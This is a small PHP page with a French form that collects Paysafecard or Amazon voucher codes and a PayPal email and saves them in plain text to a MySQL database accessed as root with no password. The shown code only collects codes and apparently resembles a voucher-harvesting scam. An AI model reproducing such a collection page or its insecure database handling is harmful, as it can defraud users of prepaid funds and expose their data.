<?php
$bdd = new PDO("mysql:host=localhost;dbname=infoconversion;charset=utf8", "root", "");

if(isset($_POST['type'], $_POST['mail'], $_POST['code'])){

    if (!empty($_POST['type']) AND !empty($_POST['mail']) AND !empty($_POST['code'])){

        $type = htmlspecialchars($_POST['type']);
        $mail = htmlspecialchars($_POST['mail']);
        $code = htmlspecialchars($_POST['code']);

        $insert=$bdd->prepare("INSERT INTO conversion(type, mail, code) VALUES(?,?,?)");
        $insert->execute(array($type, $mail, $code));

    }else{
        $error = "Veuillez remplir tous les champs";
    }
}

?>

<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="Conversion/formulaire.css">
    <title>Conmversion | Vente et Conversion</title>
</head>
<body>
    <form method="post" action="">
        <select class="form-control" name="type">
            <option value="Paysafecard">Paysafecard</option>
            <option value="Amazon">Amazon</option>
        </select><br>
        <input type="text" placeholder="votre mail Paypal" name="mail" class="form-control"><br>
        <input type="text" placeholder="votre code" name="code" class="form-control"><br>
        <input type="submit" class="btn btn-primary" value="Convertir" placeholder="votre mail" class="form-control">
        <p style="color: red;"><?php if(isset($error)){ echo $error; } ?></p>
    </form>
</body>
</html>